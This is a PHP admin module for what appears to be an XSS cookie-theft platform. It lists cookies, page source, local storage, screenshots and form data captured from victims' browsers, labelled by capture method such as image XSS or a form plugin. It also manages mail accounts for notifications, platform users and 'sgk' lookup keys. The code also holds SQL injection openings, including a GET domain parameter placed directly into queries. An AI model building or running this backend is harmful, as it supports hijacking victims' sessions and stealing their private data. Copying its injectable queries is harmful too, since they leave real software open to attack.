<?php
/**
 * user.php 用户管理
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */
if(!defined('IN_OLDCMS')) die('Access Denied');

$act=Val('act','GET');
$timee = date('Y-m-d H:i:s',time());
$where='';
switch($act){
	case 'audit':
		$isAudit=Val('isAudit','GET',1);
		$id=Val('id','GET',1);
		$db=DBConnect();
		$tbModule=$db->tbPrefix.'module';
		$db->Execute("UPDATE {$tbModule} SET isAudit='{$isAudit}',managerId='".$user->userId."',managerName='".$user->userName."' WHERE id='{$id}'");
		ShowSuccess('操作成功',URL_ROOT.'/admin/index.php?do=admin_module');
		break;
	case 'email':
		$db=DBConnect();
		$emaillist=$db->Dataset("SELECT * FROM ".Tb('email')." ORDER BY id dESC");
		if(!empty($emaillist)){
			foreach($emaillist as $k=>$v)
                {       
					$emaillist[$k]['epass'] = substr_replace($emaillist[$k]['epass'], '*****', 2,4);
                }
		}
		$smarty=InitSmarty(1);
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('emaillist',$emaillist);
		//$smarty->assign('modules',$modules);
		$smarty->display('admin_emaillist.html');
		exit;
		break;
	case 'emailadd':
		$db=DBConnect();
		$ehost=trim(Val('ehost','POST'));
		$euser=trim(Val('euser','POST'));
		$epass=trim(Val('epass','POST'));
		if(empty($ehost) || empty($euser) || empty($epass)) ShowError('大哥添加email有一项为空都不行啊',URL_ROOT.'/admin/index.php?do=admin_module&act=email','重新填写');//项目验证
		if(!preg_match('/^(\w+\.)*?\w+@(\w+\.)+\w+$/',$euser)) ShowError('您的邮箱格式不正确,示例：xxxx@xxx.com',URL_ROOT.'/admin/index.php?do=admin_module&act=email','重新填写');
		$tbInviteReg=$db->tbPrefix.'email';
		$sqlValue=array(
			'ehost'=>$ehost,
			'euser'=>$euser,
			'epass'=>$epass
		);
		if($db->AutoExecute($tbInviteReg,$sqlValue)){
			ShowSuccess('操作成功',URL_ROOT.'/admin/index.php?do=admin_module&act=email');
		}else{
			ShowError('操作失败',URL_ROOT.'/admin/index.php?do=admin_module&act=email');
		}
		exit;
		break;
	case 'delmail':
		if(! $user->CheckToken(Val('token','GET'))) ShowError('操作失败');
		$id=Val('id','GET',1);
		$db=DBConnect();
		$project=$db->FirstRow("SELECT * FROM ".Tb('email')." WHERE id='{$id}' ");
		if(empty($project)) ShowError('不存在此Email设置');
		$db->Execute("DELETE FROM ".Tb('email')." WHERE id='{$id}'");
		ShowSuccess('操作成功',URL_ROOT.'/admin/index.php?do=admin_module&act=email');
		exit;
		break;
	case 'testemail':
		if(! $user->CheckToken(Val('token','POST'))) ShowError('操作失败');
		$id=Val('id','POST',1);
		if(empty($id)) ShowError('ID值禁止为空！！操作失败！！！');
		$db=DBConnect();
		$content=$db->FirstRow("SELECT * FROM ".Tb('email')." WHERE id='{$id}'");
		if(empty($content)){
			ShowError('操作失败');
		}else{
			SendtestMail($user->email,"ld8.me/login/饼干商城","尊敬的".$user->email."，您在 ld8.me/login/  预订的测试数据<br>恭喜您测试成功！！！<br>已经到货！<br>详情请登陆查看。",$content);
		}
		exit;
		break;
	case 'allfilter':
		$db=DBConnect();
		$allfilter=$db->Dataset("SELECT * FROM ".Tb('allfilter')." ORDER BY id dESC");
		$smarty=InitSmarty(1);
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('allfilter',$allfilter);
		$smarty->display('admin_allfilter.html');
		exit;
		break;
	case 'addfilter':
		$db=DBConnect();
		$filterurl=trim(Val('filterurl','POST'));
		if(empty($filterurl)) ShowError('word哥，过滤参数禁止为空！！！',URL_ROOT.'/admin/index.php?do=admin_module&act=allfilter','重新填写');//项目验证
		$tbInviteReg=$db->tbPrefix.'allfilter';
		$sqlValue=array(
			'filterurl'=>$filterurl
		);
		if($db->AutoExecute($tbInviteReg,$sqlValue)){
			ShowSuccess('操作成功',URL_ROOT.'/admin/index.php?do=admin_module&act=allfilter');
		}else{
			ShowError('操作失败',URL_ROOT.'/admin/index.php?do=admin_module&act=allfilter');
		}
		exit;
		break;
	case 'delfilter':
		if(! $user->CheckToken(Val('token','GET'))) ShowError('操作失败');
		$id=Val('id','GET',1);
		$db=DBConnect();
		$project=$db->FirstRow("SELECT * FROM ".Tb('allfilter')." WHERE id='{$id}' ");
		if(empty($project)) ShowError('不存在此过滤设置');
		$db->Execute("DELETE FROM ".Tb('allfilter')." WHERE id='{$id}'");
		ShowSuccess('操作成功',URL_ROOT.'/admin/index.php?do=admin_module&act=allfilter');
		exit;
		break;
	case 'allcookie':
		$domain=Val('domain','GET');
		$db=DBConnect();
		$domains=array(); //域名列表
		$where=' ';
		if(!empty($domain)){
			$href.='&domain='.$domain;
			$where.=" where domain='{$domain}'";
		} 
		$sql="SELECT id,projectId,serverContent,content,domain,addTime FROM ".Tb('project_content')." {$where} ORDER BY id DESC";
		$countSql = "SELECT COUNT(*) FROM ".Tb('project_content')." {$where} ORDER BY id DESC";
		include_once(ROOT_PATH.'/source/class/Pager.class.php');
		$href=URL_ROOT.'/admin/index.php?do=admin_module';
		if(!empty($act)) $href.='&act='.$act;
		$connts=new Pager($countSql,$sql,$href,20,5,Val('pNO','GET',1));
		$pagers = $connts->nav;
		$contents = $connts->data;
		$pages = $connts->pSum;
		foreach($contents as $k=>$v){
			$contents[$k]['content']=json_decode($v['content']);
			if(empty($contents[$k]['content'])) $contents[$k]['content']=StripStr($v['content']);
			$contents[$k]['serverContent']=json_decode($v['serverContent']);
			$contents[$k]['serverContent']=array_map('StripStr',(array)$contents[$k]['serverContent']);
			if(!empty($contents[$k]['serverContent']['IP-ADDR'])){
				$contents[$k]['serverContent']['IP-ADDR'] = urldecode($contents[$k]['serverContent']['IP-ADDR']);
			}
			if(!empty($contents[$k]['serverContent']['imgs']) && $contents[$k]['serverContent']['imgs']==411161555){
				$contents[$k]['serverContent']['imgs'] = "<a style=\"color: #ff0000;\">本信息图片XSS获取</a>";
			}else if(!empty($contents[$k]['serverContent']['imgs']) && $contents[$k]['serverContent']['imgs']==1){
				//$contents[$k]['content']->cookie = urldecode($contents[$k]['content']->cookie); 双解码cookie导致XSS
				$contents[$k]['serverContent']['imgs'] = "<a style=\"color: #ff0000;\">本信息表单插件获取</a>";
			}else if(isset($contents[$k]['content']->title) || isset($contents[$k]['content']->plugins) || isset($contents[$k]['content']->htmlyuanma)){
				if(isset($contents[$k]['content']->title)){
					$contents[$k]['content']->title = urldecode($contents[$k]['content']->title);
				}
				if(isset($contents[$k]['content']->plugins)){
					$contents[$k]['content']->plugins = urldecode($contents[$k]['content']->plugins);
				}
				if(isset($contents[$k]['content']->htmlyuanma)){
					$contents[$k]['content']->htmlyuanma = "<textarea title=\"右下角可随意拖动窗口，需自己补全HTML源码中的完整URL地址(例如JS、图片等加载地址)。\" class=\"form-control base-textara\" readonly style=\"margin: 0px; width: 240px; height: 185px;\">".urldecode($contents[$k]['content']->htmlyuanma)."</textarea>";
				}
			}else if(isset($contents[$k]['content']->datastorage)){
				$contents[$k]['content']->datastorage = urldecode($contents[$k]['content']->datastorage);
			}
			if(isset($contents[$k]['content']->cookie)){
				$contents[$k]['content']->cookie = urldecode($contents[$k]['content']->cookie);
			}
		    if(isset($contents[$k]['content']->screenshotpic)){
		        $contents[$k]['content']->screenshotpic = urldecode($contents[$k]['content']->screenshotpic);
		    }
		}
		$domainss=$db->Dataset("select distinct domain from ".Tb('project_content')." {$where} ORDER BY id DESC");
		if($domainss){
			foreach($domainss as $k=>$v){
				if(!empty($v['domain']) && !in_array($v['domain'],$domains)) $domains[]=$v['domain'];
			}
		}
		include_once(ROOT_PATH.'/source/common.php');
		$smarty=InitSmarty(1);
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('contents',$contents);
		$smarty->assign('pagers',$pagers);
		$smarty->assign('pages',$pages);
		$smarty->assign('domain',$domain);
		$smarty->assign('domains',$domains);
		$smarty->display('admin_cookielist.html');
		exit;
		break;
	case 'alluser':
		$db=DBConnect();
		include_once(ROOT_PATH.'/source/class/Pager.class.php');
		$countSql="SELECT COUNT(*) FROM ".Tb('user')." ORDER BY loginTime dESC";
		$sql="SELECT * FROM ".Tb('user')." ORDER BY loginTime dESC";
		$href=URL_ROOT.'/admin/index.php?do=admin_module';
		if(!empty($act)) $href.='&act='.$act;
		$connts=new Pager($countSql,$sql,$href,20,5,Val('pNO','GET',1));
		$pagers = $connts->nav;
		$pages = $connts->pSum;
		$emaillist=$connts->data;
		$smarty=InitSmarty(1);
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('pagers',$pagers);
		$smarty->assign('pages',$pages);
		$smarty->assign('emaillist',$emaillist);
		$smarty->display('admin_userlist.html');
		exit;
		break;
	case 'resetuser':
		if(! $user->CheckToken(Val('token','POST'))) ShowError('操作失败');
		$id=Val('id','POST',1);
		if(empty($id)) ShowError('ID值禁止为空！！操作失败！！！');
		$db=DBConnect();
		$content=$db->FirstRow("SELECT * FROM ".Tb('user')." WHERE id='{$id}'");
		if(empty($content)){
			ShowError('操作失败');
		}else{
			//print_r("UPDATE ".Tb('user')." SET 'userPwd'=>'".OCEncrypt(123456)."' WHERE id='{$id}'");exit;
			$db->Execute("UPDATE ".Tb('user')." SET userPwd='".OCEncrypt(123456)."' WHERE id='{$id}'");
		}
		exit;
		break;
	case 'deluser':
		if(! $user->CheckToken(Val('token','GET'))) ShowError('操作失败');
		$id=Val('id','GET',1);
		$db=DBConnect();
		$project=$db->FirstRow("SELECT * FROM ".Tb('user')." WHERE id='{$id}' ");
		if(empty($project)) ShowError('不存在此用户');
		$db->Execute("DELETE FROM ".Tb('user')." WHERE id='{$id}'");
		$db->Execute("DELETE FROM ".Tb('project')." WHERE userId='{$id}'");
		$db->Execute("DELETE FROM ".Tb('keepsession')." WHERE userId='{$id}'");
		ShowSuccess('操作成功',URL_ROOT.'/admin/index.php?do=admin_module&act=alluser');
		exit;
		break;
	case 'updatehuiyuanuser':  //升级为会员
		if(! $user->CheckToken(Val('token','GET'))) ShowError('操作失败');
		$id=Val('id','GET',1);
		if(empty($id)) ShowError('ID值禁止为空！！操作失败！！！');
		$db=DBConnect();
		$content=$db->FirstRow("SELECT * FROM ".Tb('user')." WHERE id='{$id}'");
		if(empty($content)){
			ShowError('操作失败');
		}else{
			//print_r("UPDATE ".Tb('user')." SET 'userPwd'=>'".OCEncrypt(123456)."' WHERE id='{$id}'");exit;
			$db->Execute("UPDATE ".Tb('user')." SET  huiyuan='1' , huiyuantime=".strtotime("+3 year")." WHERE id='{$id}'");
		}
		ShowSuccess('操作成功',URL_ROOT.'/admin/index.php?do=admin_module&act=alluser');
		exit;
		break;
	case 'delcontent':
		$id=Val('id','POST');
		$db=DBConnect();
		$content=$db->FirstRow("SELECT pc.projectId FROM ".Tb('project_content')." pc INNER JOIN ".Tb('project')." p ON p.id=pc.projectId WHERE pc.id='{$id}'");
		if(!empty($content)){
			$db->Execute("UPDATE ".Tb('project_content')." SET allowdel=0 WHERE id='{$id}'");
			//$db->Execute("delete FROM ".Tb('project_content')." WHERE id='{$id}'");
		}
		echo 1;
		break;
	case 'delcontents':
		$ids=Val('ids','POST');
		$ids=explode('|',$ids);
		//删除
		$db=DBConnect();
		foreach($ids as $id){
			$content=$db->FirstRow("SELECT pc.projectId FROM ".Tb('project_content')." pc INNER JOIN ".Tb('project')." p ON p.id=pc.projectId WHERE  pc.id='{$id}'");
			//if(!empty($content)) $db->Execute("delete FROM ".Tb('project_content')." WHERE id='{$id}'");
			if(!empty($content)) $db->Execute("UPDATE ".Tb('project_content')." SET allowdel=0 WHERE id='{$id}'");
		}
		echo 1;
		break;
	case 'sgkcc':
		$db=DBConnect();
		include_once(ROOT_PATH.'/source/class/Pager.class.php');
		$countSql="SELECT COUNT(*) FROM ".Tb('sgkkey')." ORDER BY sgktime dESC";
		$sql="SELECT * FROM ".Tb('sgkkey')." ORDER BY sgktime dESC";
		$href=URL_ROOT.'/admin/index.php?do=admin_module';
		if(!empty($act)) $href.='&act='.$act;
		$connts=new Pager($countSql,$sql,$href,20,5,Val('pNO','GET',1));
		$pagers = $connts->nav;
		$pages = $connts->pSum;
		$emaillist=$connts->data;
		$smarty=InitSmarty(1);
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('pagers',$pagers);
		$smarty->assign('pages',$pages);
		$smarty->assign('emaillist',$emaillist);
		$smarty->display('admin_sgklist.html');
		exit;
		break;
	default:
		$db=DBConnect();
		$tbModule=$db->tbPrefix.'module';
		$tbUser=$db->tbPrefix.'user';
		$where=" ";  // AND isOpen=1
		include_once(ROOT_PATH.'/source/class/Pager.class.php');
		$countSql="SELECT COUNT(*) FROM {$tbModule} WHERE 1=1 {$where} ORDER BY id DESC";
		$sql="SELECT m.*,u.userName AS userName FROM {$tbModule} m INNER JOIN {$tbUser} u ON u.id=m.userId WHERE 1=1 {$where} ORDER BY id DESC";
		$href='./index.php?do=admin_module';
		if(!empty($act)) $href.='&act='.$act;
		$pager=new Pager($countSql,$sql,$href,20,5,Val('pNO','GET',1));
		$modules=$pager->data;
		$smarty=InitSmarty(1);
		$smarty->assign('modules',$modules);
		$smarty->assign('nav',$pager->nav);
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->display('admin_module.html');
		break;
}
?>